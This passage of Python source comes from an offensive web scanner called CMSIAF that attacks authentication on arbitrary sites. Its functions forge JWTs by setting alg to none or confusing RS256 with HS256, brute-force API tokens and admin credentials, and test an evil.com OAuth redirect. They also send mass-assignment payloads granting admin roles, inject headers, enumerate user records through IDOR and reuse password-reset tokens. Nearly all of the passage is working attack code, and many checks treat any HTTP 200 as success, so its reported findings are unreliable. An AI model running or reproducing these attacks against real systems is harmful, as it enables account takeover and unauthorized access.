            for oauth_url in oauth_urls:
                resp = self.session.get(oauth_url, params={'client_id': 'test', 'redirect_uri': self.url,
                    'response_type': 'code'}, verify=False, timeout=20)
                if resp.status_code == 200 and 'csrf' not in resp.text.lower():
                    return {'success': True, 'name': 'OAuth CSRF Bypass',
                            'proof': f'OAuth endpoint lacks CSRF protection at {oauth_url}',
                            'payload': 'No CSRF token required', 'severity': 'high'}
        except: pass
        return None

    def oauth_replay_attack(self):
        try:
            oauth_urls = self._find_oauth_endpoints()
            if not oauth_urls: return None
            resp = self.session.get(self.url, verify=False, timeout=20)
            code_matches = re.findall(r'code=([a-zA-Z0-9\-_]+)', resp.text)
            for code in code_matches:
                for oauth_url in oauth_urls:
                    replay_resp = self.session.get(oauth_url, params={'code': code, 'client_id': 'test'},
                        verify=False, timeout=20)
                    if replay_resp.status_code == 200:
                        return {'success': True, 'name': 'OAuth Replay Attack',
                                'proof': f'Authorization code replayed at {oauth_url}',
                                'payload': f'code={code}', 'severity': 'critical'}
        except: pass
        return None

    def oauth_token_interception(self):
        try:
            resp = self.session.get(self.url, verify=False, timeout=20)
            if '#access_token=' in resp.text or 'access_token=' in resp.text:
                token_matches = re.findall(r'access_token=([a-zA-Z0-9\-_\.]+)', resp.text)
                if token_matches:
                    return {'success': True, 'name': 'OAuth Token Interception',
                            'proof': f'Access token found in URL: {token_matches[0][:20]}...',
                            'payload': token_matches[0], 'severity': 'critical'}
        except: pass
        return None

    def oauth_implicit_flow_bypass(self):
        try:
            oauth_urls = self._find_oauth_endpoints()
            if not oauth_urls: return None
            for oauth_url in oauth_urls:
                resp = self.session.get(oauth_url, params={'client_id': 'test', 'redirect_uri': self.url,
                    'response_type': 'token'}, verify=False, timeout=20)
                if 'access_token=' in resp.url:
                    return {'success': True, 'name': 'OAuth Implicit Flow Bypass',
                            'proof': f'Implicit flow accepted at {oauth_url}',
                            'payload': 'response_type=token', 'severity': 'critical'}
        except: pass
        return None

    def oauth_redirect_uri_misconfig(self):
        try:
            oauth_urls = self._find_oauth_endpoints()
            if not oauth_urls: return None
            evil_redirect = 'https://evil.com/callback'
            for oauth_url in oauth_urls:
                resp = self.session.get(oauth_url, params={'client_id': 'test', 'redirect_uri': evil_redirect,
                    'response_type': 'code'}, verify=False, timeout=20)
                if 'redirect_uri' not in resp.text.lower() or 'error' not in resp.text.lower():
                    return {'success': True, 'name': 'OAuth Redirect URI Misconfiguration',
                            'proof': f'Redirect URI not validated: {evil_redirect}',
                            'payload': f'redirect_uri={evil_redirect}', 'severity': 'critical'}
        except: pass
        return None

    def oauth_code_injection(self):
        try:
            oauth_urls = self._find_oauth_endpoints()
            if not oauth_urls: return None
            malicious_code = 'malicious_code_' + str(int(time.time()))
            for oauth_url in oauth_urls:
                resp = self.session.get(oauth_url, params={'code': malicious_code, 'client_id': 'test'},
                    verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'OAuth Code Injection',
                            'proof': f'Injected code accepted at {oauth_url}',
                            'payload': f'code={malicious_code}', 'severity': 'critical'}
        except: pass
        return None

    def sso_saml_bypass(self):
        try:
            saml_urls = ['/sso', '/saml', '/auth/saml', '/saml/login', '/SAML']
            for saml_url in saml_urls:
                test_url = self.url + saml_url
                resp = self.session.get(test_url, verify=False, timeout=20)
                if resp.status_code == 200:
                    if 'SAMLResponse' in resp.text or 'samlp:Response' in resp.text:
                        return {'success': True, 'name': 'SSO SAML Bypass',
                                'proof': f'SAML endpoint found at {test_url}',
                                'payload': 'SAMLResponse manipulation vector', 'severity': 'critical'}
        except: pass
        return None

    def api_token_exposure(self):
        try:
            resp = self.session.get(self.url, verify=False, timeout=20)
            token_patterns = [
                (r'api[_\s]*key[\s]*[:=][\s]*["\']([a-zA-Z0-9\-_]+)["\']', 'API Key'),
                (r'token[\s]*[:=][\s]*["\']([a-zA-Z0-9\-_\.]+)["\']', 'Token'),
                (r'Authorization[\s]*:[\s]*["\']Bearer\s+([a-zA-Z0-9\-_\.]+)["\']', 'Bearer Token')
            ]
            found_tokens = []
            for pattern, token_type in token_patterns:
                matches = re.findall(pattern, resp.text, re.I)
                if matches:
                    for match in matches:
                        if len(match) > 10:
                            found_tokens.append({'type': token_type,
                                'value': match[:30] + '...' if len(match) > 30 else match})
            if found_tokens:
                return {'success': True, 'name': 'API Token Exposure',
                        'proof': f'Found {len(found_tokens)} tokens in client-side code',
                        'payload': str(found_tokens[:3]), 'severity': 'critical'}
        except: pass
        return None

    def api_token_bruteforce(self):
        try:
            api_endpoints = self._find_api_endpoints()
            if not api_endpoints: return None
            test_tokens = ['admin', 'password', '123456', 'token', 'api_key', 'secret', 'access_token']
            for endpoint in api_endpoints[:3]:
                for token in test_tokens:
                    headers = {'Authorization': f'Bearer {token}', 'X-API-Key': token, 'API-Key': token}
                    for hdr, val in headers.items():
                        resp = self.session.get(endpoint, headers={hdr: val}, verify=False, timeout=20)
                        if resp.status_code == 200:
                            return {'success': True, 'name': 'API Token Bruteforce',
                                    'proof': f'Token "{token}" accepted at {endpoint}',
                                    'payload': token, 'severity': 'high'}
        except: pass
        return None

    def api_token_idor(self):
        try:
            api_endpoints = self._find_api_endpoints()
            if not api_endpoints: return None
            for endpoint in api_endpoints[:3]:
                for i in range(1, 5):
                    test_url = endpoint.rstrip('/') + f'/{i}'
                    resp = self.session.get(test_url, verify=False, timeout=20)
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            if isinstance(data, dict) and ('email' in data or 'username' in data or 'id' in data):
                                return {'success': True, 'name': 'API Token IDOR',
                                        'proof': f'Accessed user {i} data via IDOR at {test_url}',
                                        'payload': f'User ID: {i}', 'severity': 'critical'}
                        except: pass
        except: pass
        return None

    def api_token_mass_assignment(self):
        try:
            api_endpoints = self._find_api_endpoints()
            if not api_endpoints: return None
            for endpoint in api_endpoints[:3]:
                payload = {'username': 'test_user', 'email': 'test@evil.com', 'role': 'admin',
                          'is_admin': True, 'is_superuser': True, 'permissions': ['*']}
                resp = self.session.post(endpoint, json=payload, verify=False, timeout=20)
                if resp.status_code in [200, 201, 202]:
                    return {'success': True, 'name': 'API Token Mass Assignment',
                            'proof': f'Mass assignment successful at {endpoint}',
                            'payload': json.dumps(payload)[:100] + '...', 'severity': 'critical'}
        except: pass
        return None

    def api_token_rate_limit_bypass(self):
        try:
            api_endpoints = self._find_api_endpoints()
            if not api_endpoints: return None
            endpoint = api_endpoints[0]
            success_count = 0
            for i in range(10):
                resp = self.session.get(endpoint, verify=False, timeout=20)
                if resp.status_code == 200: success_count += 1
            if success_count >= 9:
                return {'success': True, 'name': 'API Rate Limit Bypass',
                        'proof': f'{success_count}/10 requests succeeded',
                        'payload': 'No rate limiting detected', 'severity': 'medium'}
        except: pass
        return None

    def api_token_header_injection(self):
        try:
            api_endpoints = self._find_api_endpoints()
            if not api_endpoints: return None
            injection_payloads = ['\r\nX-Admin: true', '%0d%0aX-Admin: true', '\nX-Admin: true']
            for endpoint in api_endpoints[:3]:
                for payload in injection_payloads:
                    headers = {'Authorization': f'Bearer {payload}'}
                    resp = self.session.get(endpoint, headers=headers, verify=False, timeout=20)
                    if resp.status_code == 200:
                        return {'success': True, 'name': 'API Token Header Injection',
                                'proof': f'Header injection successful at {endpoint}',
                                'payload': payload[:30] + '...', 'severity': 'high'}
        except: pass
        return None

    def api_token_replay(self):
        try:
            resp = self.session.get(self.url, verify=False, timeout=20)
            token_matches = re.findall(r'[a-zA-Z0-9\-_\.]+\.[a-zA-Z0-9\-_\.]+\.[a-zA-Z0-9\-_\.]+', resp.text)
            if token_matches:
                for token in token_matches[:3]:
                    headers = {'Authorization': f'Bearer {token}'}
                    test_url = self._find_api_endpoint()
                    if test_url:
                        replay_resp = self.session.get(test_url, headers=headers, verify=False, timeout=20)
                        if replay_resp.status_code == 200:
                            return {'success': True, 'name': 'API Token Replay',
                                    'proof': f'Token replayed successfully at {test_url}',
                                    'payload': token[:30] + '...', 'severity': 'critical'}
        except: pass
        return None

    def api_token_scope_escalation(self):
        try:
            api_endpoints = self._find_api_endpoints()
            if not api_endpoints: return None
            scope_payloads = ['scope=admin', 'scope=user', 'scope=*', 'scope=all', 'permissions=admin']
            for endpoint in api_endpoints[:3]:
                for payload in scope_payloads:
                    test_url = endpoint + ('?' if '?' not in endpoint else '&') + payload
                    resp = self.session.get(test_url, verify=False, timeout=20)
                    if resp.status_code == 200:
                        return {'success': True, 'name': 'API Token Scope Escalation',
                                'proof': f'Scope escalation successful at {test_url}',
                                'payload': payload, 'severity': 'high'}
        except: pass
        return None

    def wordpress_nonce_bypass(self):
        if self.cid != 'wp': return None
        try:
            nonce_endpoints = ['/wp-admin/admin-ajax.php', '/wp-admin/admin-post.php']
            for endpoint in nonce_endpoints:
                test_url = self.url + endpoint
                resp = self.session.post(test_url, data={'action': 'test'}, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'WordPress Nonce Bypass',
                            'proof': f'Action executed without nonce at {test_url}',
                            'payload': 'action=test', 'severity': 'high'}
        except: pass
        return None

    def wordpress_jwt_misconfig(self):
        if self.cid != 'wp': return None
        try:
            jwt_paths = ['/wp-json/jwt-auth/v1/token', '/wp-json/jwt/v1/token']
            for path in jwt_paths:
                test_url = self.url + path
                resp = self.session.post(test_url, json={'username': 'admin', 'password': 'password'},
                    verify=False, timeout=20)
                if resp.status_code == 200 and 'token' in resp.text:
                    return {'success': True, 'name': 'WordPress JWT Misconfiguration',
                            'proof': f'JWT endpoint accepts weak credentials at {test_url}',
                            'payload': 'username=admin&password=password', 'severity': 'critical'}
        except: pass
        return None

    def joomla_token_bypass(self):
        if self.cid != 'joom': return None
        try:
            admin_actions = ['/administrator/index.php?option=com_config&task=save']
            for action in admin_actions:
                test_url = self.url + action
                resp = self.session.post(test_url, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'Joomla Token Bypass',
                            'proof': f'Admin action executed without CSRF token at {test_url}',
                            'payload': 'No CSRF token required', 'severity': 'critical'}
        except: pass
        return None

    def drupal_csrf_bypass(self):
        if self.cid != 'dru': return None
        try:
            rest_endpoints = ['/jsonapi', '/node', '/user/login']
            for endpoint in rest_endpoints:
                test_url = self.url + endpoint
                resp = self.session.post(test_url, json={'test': 'data'}, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'Drupal CSRF Bypass',
                            'proof': f'CSRF bypass successful at {test_url}',
                            'payload': 'No CSRF token required', 'severity': 'high'}
        except: pass
        return None

    def laravel_session_bypass(self):
        if self.cid != 'laravel': return None
        try:
            session_endpoints = ['/api/user', '/api/profile', '/user']
            for endpoint in session_endpoints:
                test_url = self.url + endpoint
                self.session.cookies.set('laravel_session', 'invalid_token')
                resp = self.session.get(test_url, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'Laravel Session Bypass',
                            'proof': f'Session bypass successful at {test_url}',
                            'payload': 'laravel_session=invalid_token', 'severity': 'high'}
        except: pass
        return None

    def craft_cms_token_bypass(self):
        if self.cid != 'craft': return None
        try:
            cp_endpoints = ['/admin/login', '/cp/login']
            for endpoint in cp_endpoints:
                test_url = self.url + endpoint
                resp = self.session.get(test_url, verify=False, timeout=20)
                if 'token' in resp.text or 'csrf' in resp.text:
                    resp2 = self.session.post(test_url, data={'action': 'login'}, verify=False, timeout=20)
                    if resp2.status_code == 200:
                        return {'success': True, 'name': 'Craft CMS Token Bypass',
                                'proof': f'CP login bypassed at {test_url}',
                                'payload': 'No token required', 'severity': 'critical'}
        except: pass
        return None

    def magento_admin_token_bypass(self):
        if self.cid != 'mg': return None
        try:
            admin_endpoints = ['/admin', '/admin/index.php', '/admin/login']
            for endpoint in admin_endpoints:
                test_url = self.url + endpoint
                resp = self.session.get(test_url, verify=False, timeout=20)
                if 'form_key' in resp.text:
                    resp2 = self.session.post(test_url, data={'login': 'admin'}, verify=False, timeout=20)
                    if resp2.status_code == 200:
                        return {'success': True, 'name': 'Magento Admin Token Bypass',
                                'proof': f'Admin login bypassed at {test_url}',
                                'payload': 'No form_key required', 'severity': 'critical'}
        except: pass
        return None

    def drupal_rest_token_bypass(self):
        if self.cid != 'dru': return None
        try:
            rest_endpoints = ['/rest', '/rest/session/token', '/rest/user']
            for endpoint in rest_endpoints:
                test_url = self.url + endpoint
                resp = self.session.get(test_url, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'Drupal REST Token Bypass',
                            'proof': f'REST token bypassed at {test_url}',
                            'payload': 'No token required', 'severity': 'high'}
        except: pass
        return None

    def typo3_token_bypass(self):
        if self.cid != 'typo3': return None
        try:
            admin_actions = ['/typo3/index.php', '/typo3/ajax.php']
            for action in admin_actions:
                test_url = self.url + action
                resp = self.session.post(test_url, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'TYPO3 Token Bypass',
                            'proof': f'TYPO3 admin action bypassed at {test_url}',
                            'payload': 'No CSRF token required', 'severity': 'critical'}
        except: pass
        return None

    def october_cms_token_bypass(self):
        if self.cid != 'octcms': return None
        try:
            backend_endpoints = ['/backend', '/backend/login']
            for endpoint in backend_endpoints:
                test_url = self.url + endpoint
                resp = self.session.get(test_url, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'October CMS Token Bypass',
                            'proof': f'Backend login bypassed at {test_url}',
                            'payload': 'No token required', 'severity': 'critical'}
        except: pass
        return None

    def concrete5_token_bypass(self):
        if self.cid != 'con5': return None
        try:
            admin_endpoints = ['/dashboard', '/login']
            for endpoint in admin_endpoints:
                test_url = self.url + endpoint
                resp = self.session.get(test_url, verify=False, timeout=20)
                if resp.status_code == 200 and 'token' not in resp.text.lower():
                    return {'success': True, 'name': 'Concrete5 Token Bypass',
                            'proof': f'Token bypassed at {test_url}',
                            'payload': 'No token required', 'severity': 'high'}
        except: pass
        return None

    def grav_token_bypass(self):
        if self.cid != 'grav': return None
        try:
            admin_endpoints = ['/admin', '/admin/login']
            for endpoint in admin_endpoints:
                test_url = self.url + endpoint
                resp = self.session.get(test_url, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'Grav CMS Token Bypass',
                            'proof': f'Admin login bypassed at {test_url}',
                            'payload': 'No token required', 'severity': 'high'}
        except: pass
        return None

    def pimcore_token_bypass(self):
        if self.cid != 'pcore': return None
        try:
            admin_endpoints = ['/admin', '/admin/login']
            for endpoint in admin_endpoints:
                test_url = self.url + endpoint
                resp = self.session.get(test_url, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'Pimcore Token Bypass',
                            'proof': f'Admin login bypassed at {test_url}',
                            'payload': 'No token required', 'severity': 'critical'}
        except: pass
        return None

    def sitecore_token_bypass(self):
        if self.cid != 'score': return None
        try:
            admin_endpoints = ['/sitecore', '/sitecore/login']
            for endpoint in admin_endpoints:
                test_url = self.url + endpoint
                resp = self.session.get(test_url, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'Sitecore Token Bypass',
                            'proof': f'Admin login bypassed at {test_url}',
                            'payload': 'No token required', 'severity': 'high'}
        except: pass
        return None

    def csrf_token_prediction(self):
        try:
            tokens = []
            for i in range(10):
                resp = self.session.get(self.url, verify=False, timeout=20)
                token_matches = re.findall(r'csrf[_-]?token[\s]*=[\s]*["\']([a-zA-Z0-9]+)["\']', resp.text, re.I)
                if token_matches: tokens.extend(token_matches)
            if len(tokens) >= 5:
                try:
                    int_tokens = [int(t) for t in tokens if t.isdigit()]
                    if int_tokens and all(int_tokens[i] + 1 == int_tokens[i+1] for i in range(len(int_tokens)-1)):
                        return {'success': True, 'name': 'CSRF Token Prediction',
                                'proof': f'Sequential CSRF tokens: {tokens[:3]}',
                                'payload': tokens[-1], 'severity': 'critical'}
                except: pass
        except: pass
        return None

    def csrf_token_reuse(self):
        try:
            resp = self.session.get(self.url, verify=False, timeout=20)
            token_matches = re.findall(r'csrf[_-]?token[\s]*=[\s]*["\']([a-zA-Z0-9\-_]+)["\']', resp.text, re.I)
            if token_matches:
                token = token_matches[0]
                test_urls = self._find_form_endpoints()
                for test_url in test_urls[:3]:
                    resp2 = self.session.post(test_url, data={'csrf_token': token, 'test': 'data'},
                        verify=False, timeout=20)
                    if resp2.status_code == 200:
                        return {'success': True, 'name': 'CSRF Token Reuse',
                                'proof': f'Token reused successfully at {test_url}',
                                'payload': f'csrf_token={token}', 'severity': 'critical'}
        except: pass
        return None

    def csrf_token_empty(self):
        try:
            test_urls = self._find_form_endpoints()
            for test_url in test_urls[:3]:
                resp = self.session.post(test_url, data={'csrf_token': ''}, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'Empty CSRF Token',
                            'proof': f'Empty CSRF token accepted at {test_url}',
                            'payload': 'csrf_token=', 'severity': 'high'}
        except: pass
        return None

    def csrf_token_param_pollution(self):
        try:
            test_urls = self._find_form_endpoints()
            for test_url in test_urls[:3]:
                resp = self.session.post(test_url, data={'csrf_token': 'valid_token', 'csrf_token': 'evil_token'},
                    verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'CSRF Token Parameter Pollution',
                            'proof': f'Parameter pollution successful at {test_url}',
                            'payload': 'csrf_token=valid&csrf_token=evil', 'severity': 'high'}
        except: pass
        return None

    def csrf_token_referer_bypass(self):
        try:
            test_urls = self._find_form_endpoints()
            for test_url in test_urls[:3]:
                resp = self.session.post(test_url, headers={'Referer': ''}, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'CSRF Referer Header Bypass',
                            'proof': f'Referer bypass successful at {test_url}',
                            'payload': 'Referer: (empty)', 'severity': 'medium'}
        except: pass
        return None

    def csrf_token_origin_bypass(self):
        try:
            test_urls = self._find_form_endpoints()
            for test_url in test_urls[:3]:
                resp = self.session.post(test_url, headers={'Origin': ''}, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'CSRF Origin Header Bypass',
                            'proof': f'Origin bypass successful at {test_url}',
                            'payload': 'Origin: (empty)', 'severity': 'medium'}
        except: pass
        return None

    def reset_token_prediction(self):
        try:
            reset_url = self._find_reset_endpoint()
            if not reset_url: return None
            tokens = []
            for i in range(5):
                resp = self.session.post(reset_url, data={'email': f'test{i}@example.com'}, verify=False, timeout=20)
                token_matches = re.findall(r'reset[_-]?token[\s]*[:=][\s]*["\']([a-zA-Z0-9]+)["\']', resp.text, re.I)
                if token_matches: tokens.extend(token_matches)
            if len(tokens) >= 3:
                try:
                    int_tokens = [int(t) for t in tokens if t.isdigit()]
                    if int_tokens and all(int_tokens[i] + 1 == int_tokens[i+1] for i in range(len(int_tokens)-1)):
                        return {'success': True, 'name': 'Reset Token Prediction',
                                'proof': f'Sequential reset tokens: {tokens[:3]}',
                                'payload': tokens[-1], 'severity': 'critical'}
                except: pass
        except: pass
        return None

    def reset_token_reuse(self):
        try:
            reset_url = self._find_reset_endpoint()
            if not reset_url: return None
            resp = self.session.post(reset_url, data={'email': 'test@example.com'}, verify=False, timeout=20)
            token_matches = re.findall(r'reset[_-]?token[\s]*[:=][\s]*["\']([a-zA-Z0-9\-_]+)["\']', resp.text, re.I)
            if token_matches:
                token = token_matches[0]
                for i in range(3):
                    reset_confirm_url = self._find_reset_confirm_endpoint()
                    if reset_confirm_url:
                        resp2 = self.session.post(reset_confirm_url, data={'token': token, 'password': f'newpass{i}'},
                            verify=False, timeout=20)
                        if resp2.status_code == 200:
                            return {'success': True, 'name': 'Reset Token Reuse',
                                    'proof': f'Reset token reused {i+1} times',
                                    'payload': token, 'severity': 'critical'}
        except: pass
        return None

    def reset_token_interception(self):
        try:
            resp = self.session.get(self.url, verify=False, timeout=20)
            token_patterns = [r'reset=([a-zA-Z0-9\-_]+)', r'token=([a-zA-Z0-9\-_]+)',
                             r'key=([a-zA-Z0-9\-_]+)', r'code=([a-zA-Z0-9\-_]+)']
            for pattern in token_patterns:
                matches = re.findall(pattern, resp.text)
                if matches:
                    for match in matches:
                        if len(match) > 10:
                            return {'success': True, 'name': 'Reset Token Interception',
                                    'proof': f'Reset token found in response: {match[:20]}...',
                                    'payload': match, 'severity': 'critical'}
        except: pass
        return None

    def reset_token_timing_attack(self):
        try:
            reset_url = self._find_reset_endpoint()
            if not reset_url: return None
            def check_token(token):
                start = time.time()
                resp = self.session.post(reset_url, data={'token': token}, verify=False, timeout=20)
                return time.time() - start
            valid_time = check_token('valid_token')
            invalid_time = sum(check_token(f'invalid_{i}') for i in range(5)) / 5
            if valid_time > invalid_time * 1.5:
                return {'success': True, 'name': 'Reset Token Timing Attack',
                        'proof': f'Timing difference: {valid_time:.3f}s vs {invalid_time:.3f}s',
                        'payload': f'Difference: {(valid_time - invalid_time):.3f}s', 'severity': 'high'}
        except: pass
        return None

    def reset_token_length_bypass(self):
        try:
            reset_url = self._find_reset_endpoint()
            if not reset_url: return None
            for length in [0, 1, 2, 3, 5, 8, 13, 21]:
                token = 'a' * length
                resp = self.session.post(reset_url, data={'token': token}, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'Reset Token Length Bypass',
                            'proof': f'Token of length {length} accepted at {reset_url}',
                            'payload': token, 'severity': 'high'}
        except: pass
        return None

    def reset_token_user_id_injection(self):
        try:
            reset_url = self._find_reset_endpoint()
            if not reset_url: return None
            for i in range(1, 5):
                resp = self.session.post(reset_url, data={'user_id': i, 'email': f'admin{i}@example.com'},
                    verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'Reset Token User ID Injection',
                            'proof': f'User ID {i} accepted at {reset_url}',
                            'payload': f'user_id={i}', 'severity': 'critical'}
        except: pass
        return None

    def _extract_jwt(self):
        for cookie in self.session.cookies:
            if 'jwt' in cookie.name.lower() or 'token' in cookie.name.lower():
                return cookie.value
        resp = self.session.get(self.url, verify=False, timeout=20)
        auth_header = resp.headers.get('Authorization', '')
        if auth_header.startswith('Bearer '): return auth_header[7:]
        if resp.text:
            jwt_matches = re.findall(r'eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+', resp.text)
            if jwt_matches: return jwt_matches[0]
        return None

    def _forge_jwt_none(self, token):
        parts = token.split('.')
        if len(parts) < 2: return token
        header = json.loads(base64.b64decode(parts[0] + '==').decode())
        header['alg'] = 'none'
        new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
        return f"{new_header}.{parts[1]}."

    def _forge_hmac_to_rsa(self, token):
        parts = token.split('.')
        if len(parts) < 2: return token
        header = json.loads(base64.b64decode(parts[0] + '==').decode())
        header['alg'] = 'RS256'
        new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
        return f"{new_header}.{parts[1]}."

    def _forge_rsa_to_hmac(self, token):
        parts = token.split('.')
        if len(parts) < 2: return token
        public_key = self._get_public_key()
        if not public_key: return token
        header = json.loads(base64.b64decode(parts[0] + '==').decode())
        header['alg'] = 'HS256'
        new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
        try:
            signature = base64.b64encode(hmac.new(public_key.encode(), f"{new_header}.{parts[1]}".encode(), 'sha256').digest()).decode().rstrip('=')
        except:
            signature = ''
        return f"{new_header}.{parts[1]}.{signature}"

    def _get_public_key(self):
        jwks_urls = ['/.well-known/jwks.json', '/jwks.json', '/oauth/jwks', '/auth/jwks']
        for jwks_url in jwks_urls:
            try:
                resp = self.session.get(self.url + jwks_url, verify=False, timeout=20)
                if resp.status_code == 200:
                    data = resp.json()
                    if 'keys' in data and data['keys']:
                        for key in data['keys']:
                            if 'n' in key and 'e' in key:
                                return key['n']
            except: continue
        return None

    def _find_jwt_endpoint(self):
        endpoints = ['/api/user', '/api/profile', '/api/me', '/api/account', '/user', '/profile',
                    '/account', '/dashboard', '/admin', '/cp', '/backend', '/api/admin']
        for endpoint in endpoints:
            test_url = self.url + endpoint
            resp = self.session.get(test_url, verify=False, timeout=15)
            if resp.status_code in [200, 401, 403]: return test_url
        return None

    def _find_admin_endpoint(self):
        paths = ['/admin', '/administrator', '/wp-admin', '/dashboard', '/cp', '/backend',
                '/manager', '/manage', '/panel']
        for path in paths:
            test_url = self.url + path
            resp = self.session.get(test_url, verify=False, timeout=15)
            if resp.status_code == 200: return test_url
        return None

    def _find_logout_endpoint(self):
        paths = ['/logout', '/logout.php', '/user/logout', '/account/logout', '/admin/logout',
                '/login/logout', '/auth/logout', '/signout']
        for path in paths:
            test_url = self.url + path
            resp = self.session.get(test_url, verify=False, timeout=15)
            if resp.status_code in [200, 302]: return test_url
        return None

    def _find_oauth_endpoints(self):
        paths = ['/oauth', '/oauth2', '/auth', '/authorize', '/oauth/authorize', '/oauth2/authorize',
                '/auth/authorize', '/oauth/token', '/oauth2/token', '/auth/token',
                '/oauth/callback', '/oauth2/callback', '/auth/callback']
        found = []
        for path in paths:
            test_url = self.url + path
            resp = self.session.get(test_url, verify=False, timeout=15)
            if resp.status_code in [200, 302, 400, 401, 403]: found.append(test_url)
        return found

    def _find_api_endpoints(self):
        paths = ['/api', '/api/v1', '/api/v2', '/api/v3', '/rest', '/rest/v1', '/graphql', '/jsonapi']
        found = []
        for path in paths:
            test_url = self.url + path
            resp = self.session.get(test_url, verify=False, timeout=15)
            if resp.status_code in [200, 400, 401, 403]: found.append(test_url)
        return found

    def _find_api_endpoint(self):
        paths = ['/api', '/api/user', '/api/status', '/health', '/ping']
        for path in paths:
            test_url = self.url + path
            resp = self.session.get(test_url, verify=False, timeout=15)
            if resp.status_code in [200, 401, 403]: return test_url
        return None

    def _find_form_endpoints(self):
        paths = ['/contact', '/submit', '/form', '/form/submit', '/comment', '/post', '/submit-form', '/save']
        found = []
        for path in paths:
            test_url = self.url + path
            resp = self.session.get(test_url, verify=False, timeout=15)
            if resp.status_code == 200 and ('form' in resp.text.lower() or 'input' in resp.text.lower()):
                found.append(test_url)
        return found

    def _find_reset_endpoint(self):
        paths = ['/reset-password', '/forgot-password', '/password-reset', '/reset', '/forgot',
                '/account/reset', '/user/reset']
        for path in paths:
            test_url = self.url + path
            resp = self.session.get(test_url, verify=False, timeout=15)
            if resp.status_code == 200: return test_url
        return None

    def _find_reset_confirm_endpoint(self):
        paths = ['/reset-confirm', '/reset-password/confirm', '/password-reset/confirm',
                '/account/reset/confirm', '/user/reset/confirm', '/reset/confirm']
        for path in paths:
            test_url = self.url + path
            resp = self.session.get(test_url, verify=False, timeout=15)
            if resp.status_code == 200: return test_url
        return None

# ===== MAIN SCAN FUNCTION =====
def scan_target(url):
    global RAW_DATA, TOTAL_REQUESTS, CSTART
    ua = get_ua()
    url = norm_url(url)
    TOTAL_REQUESTS = 0
    CSTART = time.time()
    cls()
    print(f"{Colors.GREEN}{BANNER}{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD} ═══════════════════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}  CMSIAF - Content Management Security Intelligence Framework{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}  Author: SYLHETYHACKVENGER (THE-ERROR808){Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}  WARNING: For authorized security testing only!{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD} ═══════════════════════════════════════════════════════════{Colors.RESET}")
    print()
    inf(f"Target: {url}")
    time.sleep(0.5)
    result_dir = init_result_dir(url)
    
    if CFG.get('enable_whois', True) and WHOIS_AVAILABLE:
        try:
            domain = url.replace('https://', '').replace('http://', '').split('/')[0]
            whois_info = get_whois_info(domain)
            if whois_info:
                inf(f"WHOIS: {whois_info.get('registrar', 'Unknown')}")
                if whois_info.get('creation_date'):
                    inf(f"Created: {whois_info.get('creation_date')}")
        except: pass
    
    inf("Running CMS detection...")
    detector = CMSDetector(url, ua)
    det_results = detector.detect_all()
    if det_results['cms']:
        cid = det_results['cms']
        cname = CMS_DB.get(cid, {}).get('name', cid)
        version = det_results['version']
        print(f"\n{Colors.GREEN}╔{'═'*58}╗{Colors.RESET}")
        print(f"{Colors.GREEN}║              CMS DETECTION RESULTS                          ║{Colors.RESET}")
        print(f"{Colors.GREEN}╠{'═'*58}╣{Colors.RESET}")
        print(f"║ {Colors.CYAN}CMS Detected:{Colors.RESET} {Colors.GREEN}{cname} (ID: {cid}){Colors.RESET}")
        print(f"║ {Colors.CYAN}Version:{Colors.RESET} {Colors.GREEN}{version}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Confidence:{Colors.RESET} {Colors.GREEN}{det_results['confidence']*100:.1f}%{Colors.RESET}")
        print(f"║ {Colors.CYAN}Methods:{Colors.RESET} {Colors.GREEN}{', '.join(det_results['methods'])}{Colors.RESET}")
        print(f"║ {Colors.CYAN}WAF:{Colors.RESET} {Colors.GREEN}{det_results['waf'] or 'None detected'}{Colors.RESET}")
        print(f"║ {Colors.CYAN}CDN:{Colors.RESET} {Colors.GREEN}{det_results['cdn'] or 'None detected'}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Favicon Hash:{Colors.RESET} {Colors.GREEN}{det_results.get('favicon_hash', 'Not found')}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Favicon URL:{Colors.RESET} {Colors.GREEN}{det_results.get('favicon_url', 'Not found')}{Colors.RESET}")
        if det_results['plugins']:
            print(f"║ {Colors.CYAN}Plugins:{Colors.RESET} {Colors.GREEN}{', '.join(det_results['plugins'][:3])}{Colors.RESET}")
        if det_results['themes']:
            print(f"║ {Colors.CYAN}Themes:{Colors.RESET} {Colors.GREEN}{', '.join(det_results['themes'][:3])}{Colors.RESET}")
        print(f"{Colors.GREEN}╚{'═'*58}╝{Colors.RESET}")
        update_log('cms_id', cid); update_log('cms_name', cname)
